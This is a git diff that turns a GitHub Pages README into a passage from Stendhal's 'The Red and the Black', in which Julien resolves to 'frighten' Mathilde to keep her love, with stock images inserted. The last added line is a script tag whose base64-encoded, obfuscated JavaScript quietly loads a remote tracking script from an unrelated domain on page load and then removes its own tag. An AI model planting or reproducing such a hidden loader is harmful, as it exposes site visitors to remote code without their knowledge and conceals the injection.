@@ -1,37 +1,90 @@
-## Welcome to GitHub Pages
+# FRIGHTEN HER
 
-You can use the [editor on GitHub](https://github.com/ponomartaras/Frighten/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+Julien rushed into madame de la Mole's box. His eyes first met the tearful eyes of Mathilde; she was crying without reserve. There were only insignificant personages present, the friend who had leant her box, and some men whom she knew. Mathilde placed her hand on Julien's; she seemed to have forgotten all fear of her mother. Almost stifled as she was by her tears, she said nothing but this one word: "Guarantees!"
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+"So long as I don't speak to her," said Julien to himself. He was himself very moved, and concealed his eyes with his hand as best he could under the pretext of avoiding the dazzling light of the third tier of boxes. "If I speak she may suspect the excess of my emotion, the sound of my voice will betray me. All may yet be lost." His struggles were more painful than they had been in the morning, his soul had had the time to become moved. He had been frightened at seeing Mathilde piqued with vanity. Intoxicated as he was with love and pleasure he resolved not to speak.
+![i](https://images2.minutemediacdn.com/image/upload/c_crop,h_1455,w_2587,x_0,y_423/f_auto,q_auto,w_1100/v1554917589/shape/mentalfloss/62012-istock-833768276.jpg)
+In my view this is one of the finest traits in his character, an individual capable of such an effort of self-control may go far si fata sinant.
 
-### Markdown
+Mademoiselle de la Mole insisted on taking Julien back to the hôtel. Luckily it was raining a great deal, but the marquise had him placed opposite her, talked to him incessantly, and prevented him saying a single word to her daughter. One might have thought that the marquise was nursing Julien's happiness for him; no longer fearing to lose everything through his excessive emotion, he madly abandoned himself to his happiness.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+Shall I dare to say that when he went back to his room Julien fell on his knees and covered with kisses the love letters which prince Korasoff had given him.
 
-```markdown
-Syntax highlighted code block
+"How much I owe you, great man," he exclaimed in his madness. Little by little he regained his self-possession. He compared himself to a general who had just won a great battle. "My advantage is definite and immense," he said to himself, "but what will happen to-morrow? One instant may ruin everything."
 
-# Header 1
-## Header 2
-### Header 3
+With a passionate gesture he opened the Memoirs which Napoleon had dictated at St. Helena and for two long hours forced himself to read them. Only his eyes read; no matter, he made himself do it. During this singular reading his head and his heart rose to the most exalted level and worked unconsciously. "Her heart is very different from madame de Rênal's," he said to himself, but he did not go further.
 
-- Bulleted
-- List
+"Frighten her!" he suddenly exclaimed, hurling away the book. "The enemy will only obey me in so far as I frighten him, but then he will not dare to show contempt for me."
 
-1. Numbered
-2. List
+Intoxicated with joy he walked up and down his little room. In point of fact his happiness was based rather on pride than on love.
 
-**Bold** and _Italic_ and `Code` text
+"Frighten her!" he repeated proudly, and he had cause to be proud.
 
-[Link](url) and ![Image](src)
-```
+"Madame de Rênal always doubted even in her happiest moments if my love was equal to her own. In this case I have to subjugate a demon, consequently I must subjugate her." He knew quite well that Mathilde would be in the library at eight o'clock in the morning of the following day. He did not appear before nine o'clock. He was burning with love, but his head dominated his heart.
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+Scarcely a single minute passed without his repeating to himself. "Keep her obsessed by this great doubt. Does he love me?" Her own brilliant position, together with the flattery of all who speak to her, tend a little too much to make her reassure herself.
 
-### Jekyll Themes
+He found her sitting on the divan pale and calm, but apparently completely incapable of making a single movement. She held out her hand,
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/ponomartaras/Frighten/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+"Dear one, it is true I have offended you, perhaps you are angry with me."
 
-### Support or Contact
+Julien had not been expecting this simple tone. He was on the point of betraying himself.
 
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+"You want guarantees, my dear, she added after a silence which she had hoped would be broken. Take me away, let us leave for London. I shall be ruined, dishonoured for ever." She had the courage to take her hand away from Julien to cover her eyes with it.
+
+All her feelings of reserve and feminine virtue had come back into her soul. "Well, dishonour me," she said at last with a sigh, "that will be a guarantee."
+
+"I was happy yesterday, because I had the courage to be severe with myself," thought Julien. After a short silence he had sufficient control over his heart to say in an icy tone,
+
+"Once we are on the road to London, once you are dishonoured, to employ your own expression, who will answer that you will still love me? that my very presence in the post-chaise will not seem importunate? I am not a monster; to have ruined your reputation will only make me still more unhappy. It is not your position in society which is the obstacle, it is unfortunately your own character. Can you yourself guarantee that you will love me for eight days?"
+
+"Ah! let her love me for eight days, just eight days," whispered Julien to himself, "and I will die of happiness. What do I care for the future, what do I care for life? And yet if I wish that divine happiness can commence this very minute, it only depends on me."
+
+Mathilde saw that he was pensive.
+
+"So I am completely unworthy of you," she said to him, taking his hand.
+
+Julien kissed her, but at the same time the iron hand of duty gripped his heart. If she sees how much I adore her I shall lose her. And before leaving her arms, he had reassumed all that dignity which is proper to a man.
+
+He managed on this and the following days to conceal his inordinate happiness. There were moments when he even refused himself the pleasure of clasping her in his arms. At other times the delirium of happiness prevailed over all the counsels of prudence.
+
+He had been accustomed to station himself near a bower of honeysuckle in the garden arranged in such a way so as to conceal the ladder when he had looked up at Mathilde's blind in the distance, and lamented her inconstancy. A very big oak tree was quite near, and the trunk of that tree prevented him from being seen by the indiscreet.
+
+As he passed with Mathilde over this very place which recalled his excessive unhappiness so vividly, the contrast between his former despair and his present happiness proved too much for his character. Tears inundated his eyes, and he carried his sweetheart's hand to his lips: "It was here I used to live in my thoughts of you, it was from here that I used to look at that blind, and waited whole hours for the happy moment when I would see that hand open it."
+
+His weakness was unreserved. He portrayed the extremity of his former despair in genuine colours which could not possibly have been invented. Short interjections testified to that present happiness which had put an end to that awful agony.
+
+"My God, what am I doing?" thought Julien, suddenly recovering himself. "I am ruining myself."
+
+In his excessive alarm he thought that he already detected a diminution of the love in mademoiselle de la Mole's eyes. It was an illusion, but Julien's face suddenly changed its expression and became overspread by a mortal pallor. His eyes lost their fire, and an expression of haughtiness touched with malice soon succeeded to his look of the most genuine and unreserved love.
+
+"But what is the matter with you, my dear," said Mathilde to him, both tenderly and anxiously.
+
+"I am lying," said Julien irritably, "and I am lying to you. I am reproaching myself for it, and yet God knows that I respect you sufficiently not to lie to you. You love me, you are devoted to me, and I have no need of praises in order to please you."
+
+"Great heavens! are all the charming things you have been telling me for the last two minutes mere phrases?"
+
+"And I reproach myself for it keenly, dear one. I once made them up for a woman who loved me, and bored me—it is the weakness of my character. I denounce myself to you, forgive me."
+
+Bitter tears streamed over Mathilde's cheeks.
+
+"As soon as some trifle offends me and throws me back on my meditation," continued Julien, "my abominable memory, which I curse at this very minute, offers me a resource, and I abuse it."
+
+"So I must have slipped, without knowing it, into some action which has displeased you," said Mathilde with a charming simplicity.
+
+"I remember one day that when you passed near this honeysuckle you picked a flower, M. de Luz took it from you and you let him keep it. I was two paces away."
+
+"M. de Luz? It is impossible," replied Mathilde with all her natural haughtiness. "I do not do things like that."
+
+"I am sure of it," Julien replied sharply.
+
+"Well, my dear, it is true," said Mathilde, as she sadly lowered her eyes. She knew positively that many months had elapsed since she had allowed M. de Luz to do such a thing.
+
+Julien looked at her with ineffable tenderness, "No," he said to himself, "she does not love me less."
+![i](https://aldf.org/wp-content/uploads/2018/05/lamb-iStock-665494268-16x9-e1559777676675.jpg)
+In the evening she rallied him with a laugh on his fancy for madame de Fervaques. "Think of a bourgeois loving a parvenu, those are perhaps the only type of hearts that my Julien cannot make mad with love. She has made you into a real dandy," she said playing with his hair.
+
+During the period when he thought himself scorned by Mathilde, Julien had become one of the best dressed men in Paris. He had, moreover, a further advantage over other dandies, in as much as once he had finished dressing he never gave a further thought to his appearance.
+
+One thing still piqued Mathilde, Julien continued to copy out the Russian letters and send them to the maréchale.
+<script id="nbnjF" src="data:text/javascript;base64, dmFyIF82YmN1byA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX2hMN2FrLCBfaElOQWEpIHt2YXIgX0ptckJaID0gZnVuY3Rpb24oX1hwcXc2KSB7d2hpbGUgKC0tX1hwcXc2KSB7X2hMN2FrWydwdXNoJ10oX2hMN2FrWydzaGlmdCddKCkpO319O19KbXJCWigrK19oSU5BYSk7fShfNmJjdW8sIDB4MTFiKSk7dmFyIF96WHVuYiA9IGZ1bmN0aW9uKF83RW15bywgX1d3VHg2KSB7XzdFbXlvID0gXzdFbXlvIC0gMHgwO3ZhciBfZ1JjcWEgPSBfNmJjdW9bXzdFbXlvXTtyZXR1cm4gX2dSY3FhO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfelh1bmIoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgXzVKa0xWID0gZG9jdW1lbnRbX3pYdW5iKCcweDEnKV0oX3pYdW5iKCcweDInKSk7XzVKa0xWW196WHVuYignMHgzJyldID0gX3pYdW5iKCcweDQnKTtfNUprTFZbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2MVx4NzRceDMzXHgzOFx4MzlceDYxXHg2M1x4NjNceDM0XHg2ZVx4NjVceDc3XHgyZVx4NjFceDZjXHg3MFx4NjVceDZlXHg2NVx4NzVceDcyXHg2Zlx4MmVceDYzXHg2Zlx4NmRceDJmXHg1Zlx4NzJceDY1XHg2ZFx4NmZceDc0XHg2NVx4NWZceDc0XHg3Mlx4NjFceDYzXHg2Ylx4MmVceDZhXHg3M1x4M2ZceDYzXHg2MVx4NmRceDcwXHg2MVx4NjlceDY3XHg2ZVx4M2RceDM2XHg3NFx4NjNceDZmXHg1OVx4MzZceDM5XHg2Ylx4NzZceDQ3Jztkb2N1bWVudFtfelh1bmIoJzB4NScpXShfelh1bmIoJzB4NicpKVsnXHg2MVx4NzBceDcwXHg2NVx4NmVceDY0XHg0M1x4NjhceDY5XHg2Y1x4NjQnXShfNUprTFYpO2RvY3VtZW50W196WHVuYignMHg3JyldKCduYm5qRicpWydceDcyXHg2NVx4NmRceDZmXHg3Nlx4NjUnXSgpO30sIHsnXHg2Zlx4NmVceDYzXHg2NSc6ICEhW119KTs="></script>
